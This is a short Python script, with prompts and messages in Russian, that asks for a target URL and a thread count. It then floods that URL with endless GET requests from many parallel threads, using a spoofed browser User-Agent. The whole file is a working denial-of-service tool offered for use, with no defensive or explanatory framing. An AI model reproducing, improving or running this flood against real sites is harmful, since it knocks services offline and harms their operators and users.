import colorama
import threading
import requests
import time
def dos(target):
    while True:
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }
            res = requests.get(target, headers=headers)
            print(colorama.Fore.YELLOW + "Запрос отправлен!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Ошибка соединения!")
threads = 20

url = input("Введите URL: ")

try:
    threads = int(input("Введите количество потоков: "))
except ValueError:
    exit("Некорректное количество потоков!")

if not url.__contains__("http"):
    exit("URL не содержит http или https!")

if not url.__contains__("."):
    exit("Неверный домен")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " поток запущен!")
